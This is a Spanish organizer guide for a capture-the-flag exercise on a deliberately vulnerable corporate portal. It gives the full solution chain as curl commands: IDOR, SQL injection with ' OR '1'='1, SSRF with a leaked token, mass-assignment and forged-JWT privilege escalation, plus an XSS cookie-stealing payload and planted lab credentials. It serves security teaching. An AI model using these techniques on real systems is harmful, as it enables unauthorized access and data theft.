# Guía de administradores — Acme Employee Portal (ejercicio de seguridad)

> **CONFIDENCIAL — SOLO ORGANIZADORES.** No compartir con los participantes.
> El repositorio debe permanecer **privado**: los equipos solo acceden a la
> aplicación desplegada, nunca a este fichero ni al código.

## 1. Resumen del juego

- Los equipos ven un portal empresarial normal (**Acme Corporation**).
- Gana el primer equipo que obtenga la **referencia de divulgación** de la
  *Compliance Vault* (`/vault`) y la reporte según las instrucciones del memo:
  ```text
  GCS{GLOBAL_CYBER_SECURITY_2026}
  ```
- Contacto de reporte (configurable con `NOTIFY_CONTACT`):
  `soc@gcs-2026.example`. El memo de la bóveda ya indica al equipo qué hacer.
- El progreso es **invisible**: la app no registra por equipo en qué punto va
  cada uno. Para situar a un equipo, pedidles que os digan **qué valores tienen**
  (fragmentos, token) sin que revelen la FLAG: `custodio-1`, `custodio-2`,
  *service token*. Según lo que tengan, sabréis en qué etapa están (ver §4).

## 2. Datos maestros

### Acceso inicial

| Dato | Valor |
| ---- | ----- |
| URL (local) | `http://localhost:3000` |
| Cuenta de entrada | `intern@acme-corp.com` / `Welcome2026!` (rol `employee`) |
| Dónde la encuentran los equipos | `Documents > IT Onboarding Guide` (dentro del portal) |

### Secretos (valores por defecto; ver `lib/secrets.ts`)

| Secreto | Valor | Dónde se filtra en el juego |
| ------- | ----- | --------------------------- |
| `BETTER_AUTH_SECRET` | `acme-dev-secret-2024` | `/backup/env.backup` |
| `INTERNAL_API_TOKEN` (cabecera `x-service-token`) | `acme-int-7f3a9c2e-token` | `/backup/env.backup` |
| `VAULT_PART_1` (custodio-1) | `ACME-7F3A-91KD` | backup + `/api/shadow/archive` |
| `VAULT_PART_2` (custodio-2) | `ACME-9C2E-44ZX` | `/analyst` y `/api/analyst/panel` |
| `FLAG_FINAL` | `GCS{GLOBAL_CYBER_SECURITY_2026}` | Solo `POST /api/vault/unlock` |

> Si se despliega con variables de entorno distintas, la cadena sigue siendo
> válida porque el backup siempre filtra los valores vigentes; solo cambian los
> literales de esta guía.

### Mapa de rutas relevantes

| Ruta | Qué es (cara visible) | Papel en el juego |
| ---- | --------------------- | ----------------- |
| `/robots.txt` | Fichero de rastreo | Enumera `/backup/`, `/analyst`, `/vault`, `/api/shadow/`, `/api/config` |
| `/backup` y `/backup/env.backup` | Índice + snapshot nocturno | Filtra secreto, token y custodio-1 |
| `/api/config` | Feature flags del frontend | Mapa interno (lo pide el dashboard) |
| `/api/users/me?id=N` | Ficha de empleado | **IDOR**: `?id=1` expone la nota interna de la CEO |
| `/api/tickets` | Cola de tickets | **SQLi** en `?q=` + deep-link sin autorización (`?id=1042`) |
| `/api/scanner`, `/api/documents/preview` | Inspector de enlaces / vista previa | **SSRF** (reenvían token de servicio) |
| `/api/shadow/archive` | Archivo trimestral interno | Exige `x-service-token`; da custodio-1 |
| `/api/sso/[...all]` | SSO corporativo (Better Auth real) | **Registro con `role` escribible** → analyst |
| `PATCH /api/users/me` | Editar perfil | **Asignación masiva**: acepta `{"role":"analyst"}` y refirma la sesión |
| `/analyst`, `/api/analyst/panel` | Workspace de SOC (oculto del menú) | Exige rol analyst/admin; da custodio-2 |
| `/vault`, `POST /api/vault/unlock` | Bóveda de cumplimiento | Pide los 3 valores juntos → FLAG |
| `POST /api/flags/verify` | «Asset tag verification» | Valida una FLAG sin abrir la bóveda (uso de organizadores) |
| `POST /api/phishing/verify` | Triaje SOC | Solo analyst/admin (ambientación) |

## 3. Walkthrough completo (solución de referencia)

> Comandos `curl` (Linux/macOS/Git-Bash) y su equivalente PowerShell donde
> importa el manejo de cookies. Sustituid el host por el del despliegue.

**Paso 1 — Entrar.** La guía de onboarding es pública (ruta `/onboarding`,
sin login, enlazada desde el login y la landing) y trae la cuenta temporal:
```bash
curl -c jar.txt -X POST http://localhost:3000/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"intern@acme-corp.com","password":"Welcome2026!"}'
```

**Paso 2 — Reconocimiento.** Abrir `/robots.txt` y `GET /api/config`. Anotar
`/backup/`, `/analyst`, `/vault`, `/api/shadow/archive`, `/api/scanner`.

**Paso 3 — Backup.** Descargar el snapshot (no pide login):
```bash
curl http://localhost:3000/backup/env.backup
```
Anotar `BETTER_AUTH_SECRET`, `INTERNAL_API_TOKEN` y `VAULT_CUSTODIAN_1`.

**Paso 4 — IDOR.** Con la sesión del paso 1:
```bash
curl -b jar.txt 'http://localhost:3000/api/users/me?id=1'
```
La `internalNote` de V. Ashford confirma el shadow archive, el token en los
backups y que el custodio-2 lo tiene L. Fernández en el workspace.

**Paso 5 — SQLi en tickets.** La búsqueda filtra restringidos… salvo con
inyección:
```bash
curl -b jar.txt 'http://localhost:3000/api/tickets?q=%27%20OR%20%271%27=%271'
# Equivale a:  ' OR '1'='1
```
Leer el **ticket #1042** (procedimiento VAULT-2026-04 completo) y el **#1044**
(confiesa el aprovisionamiento temporal vía perfil). Atajo equivalente:
`GET /api/tickets?id=1042`.

**Paso 6 — SSRF.** Pedir al inspector que lea el archivo interno pasando el
token del paso 3:
```bash
curl -b jar.txt -X POST http://localhost:3000/api/scanner \
  -H 'Content-Type: application/json' \
  -d '{"url":"/api/shadow/archive","serviceToken":"acme-int-7f3a9c2e-token"}'
```
Respuesta: `"custodian-1":"ACME-7F3A-91KD"` + memo hacia `/analyst`.

**Paso 7 — Escalada a analyst** (cualquiera de las 3 vías vale):

- *Vía A (perfil):*
  ```bash
  curl -b jar.txt -c jar.txt -X PATCH http://localhost:3000/api/users/me \
    -H 'Content-Type: application/json' -d '{"role":"analyst"}'
  ```
- *Vía B (SSO):* `POST /api/sso/sign-up/email` con
  `{"name":"…","email":"…","password":"…","role":"analyst"}` (sin verificación
  de email). La sesión SSO abre `/analyst` y `/api/analyst/panel`.
- *Vía C (JWT forjado):* firmar
  `{"sub":"u-carlos","email":"intern@acme-corp.com","name":"…","role":"analyst"}`
  en HS256 con `BETTER_AUTH_SECRET` y usarlo como cookie `acme_session` o
  `Authorization: Bearer`.

**Paso 8 — Custodio-2:**
```bash
curl -b jar.txt http://localhost:3000/api/analyst/panel
# → "custodian-2":"ACME-9C2E-44ZX" (también visible en la página /analyst)
```

**Paso 9 — Bóveda y FLAG:**
```bash
curl -b jar.txt -X POST http://localhost:3000/api/vault/unlock \
  -H 'Content-Type: application/json' \
  -d '{"part1":"ACME-7F3A-91KD","part2":"ACME-9C2E-44ZX","serviceToken":"acme-int-7f3a9c2e-token"}'
# → {"ok":true,"memo":"...","reference":"GCS{GLOBAL_CYBER_SECURITY_2026}","notify":"..."}
```
El equipo debe reportar `reference` al contacto del memo con su nombre de equipo.

## 4. Guía por etapa (diagnóstico + pistas graduadas)

> Cómo usarla: localizad al equipo por lo que ya tiene (ver §1) y dad **solo el
> nivel de pista necesario**. No reveléis nunca literales (tokens, fragmentos)
> salvo en el nivel 3, y jamás la FLAG.

### E0 — Entrada y reconocimiento
- **Señal de atasco:** «no sé ni por dónde empezar / no tengo cuenta».
- 🟢 Pista 1: «Eres un empleado nuevo sin cuenta. La propia página de login menciona una guía de onboarding pública. ¿Dónde está y qué trae?»
- 🟡 Pista 2: «`/onboarding` trae una cuenta temporal. Y fíjate en qué consume el dashboard en la pestaña de red.»
- 🔴 Solución: credenciales de la guía pública + `/robots.txt` + `/api/config`.
- 📣 **Para la presentación:** esto se llama **reconocimiento pasivo / *footprinting***: enumerar la superficie expuesta a partir de ficheros públicos (`robots.txt`, `sitemap.xml`) y del tráfico del propio frontend. `robots.txt` no es un control de acceso: todo lo listado ahí es legible por cualquiera. Referencias: [MITRE ATT&CK — Reconnaissance (TA0043)](https://attack.mitre.org/tactics/TA0043/), [documentación de Google sobre robots.txt](https://developers.google.com/search/docs/crawling-indexing/robots/intro).
- 🌍 **Caso real (práctica documentada):** las entradas `Disallow:` han servido repetidamente como mapa para encontrar paneles de administración, backups y APIs internas en auditorías y programas de *bug bounty*. Análisis del patrón: [ScanSearch — filtraciones vía robots.txt y sitemap.xml](https://scansearch.net/en/articles/uncovering-sensitive-data-leaks-robots-txt-sitemap-xml/), [Infosec Writeups — el playbook de robots.txt](https://infosecwriteups.com/disallowed-but-discoverable-the-hackers-robots-txt-playbook-73dca570f23e).

### E1 — Backup expuesto (CWE-530 / CWE-798)
- **Señal:** tienen sesión pero no avanzan.
- 🟢 «Hay una notificación del sistema sobre una tarea nocturna. ¿A dónde apunta?»
- 🟡 «Abre `/backup`. ¿Qué publica el trabajo nocturno y qué contiene?»
- 🔴 `GET /backup/env.backup` → secreto, token, custodio-1.
- 📣 **Para la presentación:** esto se llama **exposición de secretos** (credenciales y tokens en backups, repositorios o ficheros `.env` publicados). Referencias: [CWE-530 (backup expuesto)](https://cwe.mitre.org/data/definitions/530.html), [CWE-798 (credenciales hardcodeadas)](https://cwe.mitre.org/data/definitions/798.html).
- 🌍 **Caso real — Uber (2016):** atacantes encontraron claves de AWS en un repositorio de GitHub de un ingeniero y descargaron datos de **57 millones** de usuarios y conductores. Uber lo ocultó más de un año pagando 100.000 $ a los atacantes. Impacto: acuerdo de **148 millones $** con los estados de EE. UU. y condena penal de su CSO por encubrimiento. Fuentes: [BBC](https://www.bbc.co.uk/news/technology-42075306), [Huntress — análisis del caso](https://www.huntress.com/threat-library/data-breach/uber-data-breach).

### E2 — IDOR en fichas (CWE-639)
- **Señal:** tienen el backup pero no saben qué hacer con el token.
- 🟢 «Los enlaces del directorio llevan un `?id=`. ¿Qué pasa si miras la ficha número 1?»
- 🟡 «La ficha incluye una nota interna que no debería verse. Léela entera.»
- 🔴 `GET /api/users/me?id=1` → nota de la CEO (shadow archive + custodios).
- 📣 **Para la presentación:** esto se llama **IDOR (*Insecure Direct Object Reference*)**, hoy clasificado como **BOLA (*Broken Object-Level Authorization*)**: el servidor no comprueba que el objeto pedido (`id=1`) pertenezca al usuario, basta con adivinar el identificador. Es el riesgo nº 1 del OWASP API Security Top 10. Referencias: [CWE-639](https://cwe.mitre.org/data/definitions/639.html), [OWASP API Security Top 10](https://owasp.org/API-Security/).
- 🌍 **Caso real — First American Financial (2019):** su web exponía documentos hipotecarios con IDs secuenciales, sin login: cambiando un dígito se accedía a los de otros clientes. Expuestos **885 millones** de documentos (cuentas bancarias, SSNs, declaraciones). Impacto: investigación del regulador de Nueva York y multa, además de demandas colectivas. Fuentes: [Krebs on Security](https://krebsonsecurity.com/2019/05/first-american-financial-corp-leaked-hundreds-of-millions-of-title-insurance-records/), [New York Times](https://www.nytimes.com/2019/05/24/technology/data-leak-first-american.html).

### E3 — SQLi en tickets (CWE-89)
- **Señal:** no encuentran el procedimiento de la bóveda.
- 🟢 «La cola dice que entiende operadores avanzados. Prueba a romper el filtro con comillas.»
- 🟡 «Un clásico `' OR '1'='1` en el parámetro de búsqueda. ¿Cuántos tickets salen ahora?»
- 🔴 Query del paso 5 → tickets #1042 (procedimiento) y #1044 (pista de escalada).
- 📣 **Para la presentación:** esto se llama **inyección SQL (SQLi)**: la entrada del usuario se concatena en la consulta y `' OR '1'='1` convierte el filtro en «devolver todo». Lleva 25 años en el OWASP Top 10. Referencias: [CWE-89](https://cwe.mitre.org/data/definitions/89.html), [OWASP A03:2021 — Injection](https://owasp.org/Top10/A03_2021-Injection/).
- 🌍 **Caso real — TalkTalk (2015):** atacantes (uno de 15 años, con la herramienta SQLMap) explotaron SQLi en tres páginas heredadas de Tiscali y accedieron a datos de **156.959 clientes** (incluidas 15.656 cuentas bancarias). La empresa había sufrido dos SQLi previas sin reaccionar. Impacto: multa récord entonces de **400.000 £** del regulador británico (ICO), que sentenció que «la SQLi es bien conocida, existen defensas y TalkTalk debía conocer el riesgo». Fuentes: [ICO — cronología de la investigación](https://ico.org.uk/about-the-ico/media-centre/talktalk-cyber-attack-how-the-ico-investigation-unfolded), [BBC](https://www.bbc.com/news/business-37565367), [Wikipedia](https://en.wikipedia.org/wiki/2015_TalkTalk_data_breach).

### E4 — SSRF (CWE-918)
- **Señal:** tienen el token pero el navegador les da 403 en el archivo.
- 🟢 «Hay dos formularios que hacen que el *servidor* visite URLs por ti: vista previa de documentos y el webhook de ajustes.»
- 🟡 «El inspector acepta rutas internas y un token de servicio. Pídele `/api/shadow/archive`.»
- 🔴 Comando del paso 6 → custodio-1 + memo.
- 📣 **Para la presentación:** esto se llama **SSRF (*Server-Side Request Forgery*)**: el atacante consigue que el *servidor* haga peticiones en su nombre, alcanzando recursos internos (red privada, metadatos cloud) inaccesibles desde fuera. Referencias: [CWE-918](https://cwe.mitre.org/data/definitions/918.html), [OWASP Top 10](https://owasp.org/Top10/).
- 🌍 **Caso real — Capital One (2019):** una atacante explotó SSRF en un WAF para consultar el servicio de metadatos de AWS, robar las credenciales temporales del servidor y descargar datos de **106 millones** de solicitantes de tarjetas. Impacto: multa de **80 M$** del regulador bancario (OCC) + acuerdo judicial de **190 M$**, y condena penal de la atacante. Fuentes: [Capital One — información oficial del incidente](https://www.capitalone.com/digital/facts2019/), [Huntress — análisis técnico SSRF](https://www.huntress.com/threat-library/data-breach/capital-one-data-breach).

### E5 — Escalada a analyst (CWE-915 / CWE-284)
- **Señal:** tienen custodio-1 pero `/analyst` les da 403.
- 🟢 «Necesitas el rol de analista. ¿Dónde se cambia tu rol? ¿Qué campos acepta realmente ese formulario?»
- 🟡 «Mira el ticket #1044 otra vez. Y prueba a registrarte en el SSO… ¿qué campos acepta?»
- 🔴 Vías 7A/7B/7C → `/analyst` → custodio-2.
- 📣 **Para la presentación:** esto combina **asignación masiva (*Mass Assignment*, CWE-915)** —el servidor aplica campos que el cliente no debería controlar, como `role`— con **secretos débiles (CWE-798)** que permiten forjar sesiones. Referencias: [CWE-915](https://cwe.mitre.org/data/definitions/915.html), [OWASP — Mass Assignment Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Mass_Assignment_Cheat_Sheet.md).
- 🌍 **Casos reales:**
  - *GitHub (2012):* Egor Homakov explotó mass assignment en Rails para añadir su clave SSH a la organización y hacer ***push* al repositorio maestro de Ruby on Rails**. Impacto: GitHub auditó todo su código y Rails cambió a listas blancas por defecto. Fuente: [Ars Technica](https://arstechnica.com/information-technology/2012/03/hacker-commandeers-github-to-prove-vuln-in-ruby/).
  - *Mirai / Dyn (2016):* el malware probaba solo **62 combinaciones de credenciales por defecto** (admin/admin…) en cámaras y routers, reclutó ~100.000 dispositivos y tumbó a Twitter, Netflix, Spotify o Reddit durante horas. Impacto: la mayor caída de Internet de la época por culpa de «secretos» de fábrica. Fuente: [Krebs on Security](https://krebsonsecurity.com/2016/10/hacked-cameras-dvrs-powered-todays-massive-internet-outage/).

### E6 — Bóveda (objetivo)
- **Señal:** tienen los 3 valores pero falla.
- 🟢 «La bóveda exige los tres valores *juntos* y tal cual: revisa espacios y guiones.»
- 🟡 «El error es genérico a propósito; verifica cada valor contra su fuente (backup, archivo, panel).»
- 🔴 Comando del paso 9 → FLAG + instrucciones de reporte.
- 📣 **Para la presentación:** la lección final es el **control de acceso roto (*Broken Access Control*, nº 1 del OWASP Top 10)**: cada fallo aislado parecía menor, pero encadenados permiten llegar a la función más sensible del sistema. Referencia: [OWASP A01:2021 — Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/).
- 🌍 **Caso real — Panera Bread (2018):** su web exponía una API **sin autenticación** que devolvía millones de registros de clientes (nombres, emails, direcciones, cumpleaños y tarjetas parciales) con solo conocer el formato de la petición. Impacto: exposición masiva de datos de fidelización y daño reputacional. Fuente: [Krebs on Security](https://krebsonsecurity.com/2018/04/panerabread-com-leaks-millions-of-customer-records/).

### E7 — XSS (ambientación; fuera de la ruta crítica)
- **Vectores del juego:** bio de perfil y respuestas de tickets se guardan y renderizan como HTML; la consulta de `/search` se refleja sin escapar. Sin CSP y con cookie de sesión legible desde JS, un payload como `<img src=x onerror=alert(document.cookie)>` roba la sesión de quien lo visualice.
- 📣 **Para la presentación:** esto se llama **XSS (*Cross-Site Scripting*, CWE-79)**: inyectar JavaScript que se ejecuta en el navegador de otros usuarios. Referencias: [CWE-79](https://cwe.mitre.org/data/definitions/79.html), [OWASP — XSS](https://owasp.org/www-community/attacks/xss/).
- 🌍 **Caso real — British Airways (2018):** el grupo Magecart inyectó solo **22 líneas de JavaScript** en la página de pago de ba.com; cada tarjeta introducida se copiaba a un servidor atacante. Afectados ~429.000 clientes. Impacto: multa de **20 M£** del regulador británico (la propuesta inicial fue de 183 M£, la mayor del GDPR entonces). Fuentes: [Wikipedia](https://en.wikipedia.org/wiki/British_Airways_data_breach), [BBC](https://www.bbc.co.uk/news/technology-54568784).

## 5. Verificación del despliegue (checklist de 5 minutos)

```bash
BASE=http://localhost:3000
curl -s $BASE/robots.txt | head -3                              # disallows
curl -s $BASE/backup/env.backup | grep -c INTERNAL_API_TOKEN    # 1
curl -s -X POST $BASE/api/auth/login -H 'Content-Type: application/json' \
  -d '{"email":"intern@acme-corp.com","password":"Welcome2026!"}' | grep -c ok  # 1
curl -s $BASE/api/config | grep -c analystWorkspace             # 1
# y el walkthrough §3 de punta a punta hasta obtener la FLAG
```

Además: comprobad que la FLAG **no** aparece en el HTML/JS servido (verificado
en build; repetid con `view-source:` del login si cambiáis código).

## 6. Reset

Reiniciad el proceso (`bun run start` / `bun run dev`). Todo el estado mutable
—comentarios y bios con XSS, tickets creados, base del SSO— vive **en memoria**;
al reiniciar vuelve al estado inicial. No hay migraciones ni ficheros que borrar.

## 7. Problemas frecuentes

- **«La bóveda da 403 con valores que ayer valían»** → reiniciaron el servidor
  con variables de entorno distintas: pedid los valores *actuales* del backup,
  no los de esta guía.
- **JWT forjado rechazado** → secreto mal copiado, `role` distinto de
  `analyst`/`admin`, o token caducado (12 h). Regeneradlo.
- **SSO «olvida» usuarios** → normal: la base del SSO es en memoria y se vacía
  al reiniciar/desplegar.
- **El scanner devuelve 502/timeout** → la URL debe ser `http(s)` o ruta `/…`
  del propio portal; `file:`/`data:` están bloqueados.
- **Un equipo pegó la FLAG en un ticket/bio** → es contenido mutable en memoria:
  basta reiniciar para limpiarlo; recordadles no compartirla.
- **Un equipo aparece como `admin` sin haber escalado rol** → es una vía
  alternativa legítima: el login legacy también es inyectable
  (`email` = `' OR '1'='1` con cualquier contraseña inicia sesión como
  administrador). Además distingue «email desconocido» de «contraseña
  incorrecta» (enumeración) y no limita intentos.
- **Sospecha de reporte falso** → validad sin abrir la bóveda:
  `POST /api/flags/verify {"flag":"…"}` → `{"valid":true,…}`.

## 8. Reglas de apoyo a participantes

1. Nunca digáis las palabras: SQLi, IDOR, SSRF, XSS, escalada, FLAG, CTF, Better Auth.
2. Hablad como soporte IT de la empresa ficticia («¿has mirado la ficha del empleado 1?», «el inspector de enlaces acepta recursos internos»).
3. Dad pistas de nivel 🟢 primero; subid solo si llevan ≥20–30 min atascados en el mismo punto.
4. No resolváis por ellos: orientad al siguiente descubrimiento, no al comando final.
5. Si un equipo reporta la FLAG, verificadla con `/api/flags/verify` y anotad orden de llegada y nombre del equipo.
